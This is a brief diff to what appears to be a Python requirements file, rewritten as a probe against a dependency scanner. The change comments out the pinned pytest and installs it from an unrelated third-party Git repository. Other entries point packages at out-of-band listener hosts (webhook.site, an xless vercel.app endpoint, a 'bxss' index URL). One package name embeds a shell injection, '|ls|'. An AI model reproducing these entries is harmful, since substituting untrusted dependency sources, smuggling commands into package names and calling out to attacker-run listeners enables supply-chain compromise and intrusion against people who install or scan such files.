@@ -1,8 +1,8 @@
 # --index-url https://bxss.r0l.me/snyk-pip
 # colorama==0.4.3
-pytest==6.2.2
+# pytest==6.2.2
 win_unicode_console==0.5
-colorama @ git+https://github.com/snkpinkh1/bloop
+pytest @ git+https://github.com/snkpinkh1/bloop
 snyk7 @ git+https://xless-bxub8u6tp.vercel.app/home/snyk4
 abcdef0000|ls|.. @ git+https://webhook.site/40ec81d0-651c-4818-b79f-b4e50686f6ad/a/b/c/def
 https://xless-bxub8u6tp.vercel.app/snyk5
